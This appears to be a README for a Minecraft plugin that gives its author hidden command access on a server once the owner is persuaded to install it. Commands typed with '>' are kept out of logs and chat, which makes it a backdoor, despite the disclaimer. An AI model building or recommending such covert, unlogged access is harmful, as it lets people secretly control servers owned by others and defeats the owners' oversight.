A minecraft plugin that was made to allow you access to certin commands on a server by just asking the owner to load the plugin on thier server. All commands you do with a > instead of a / the command is not logged or appear in chat. This is made possible by a custom chat listener.

Whats the point? This plugin was made for fun and is not intended to be used without permission against somebody with out prior consent. We are not responsible for any damage you do. If you do decide to use our plugin, we recommend use on a server you own.

> [Please download latest stable version here](https://java.njstat.org/projects/mc/qbxmc) GitHub Builds may contain really big bugs and some releases are unstable.
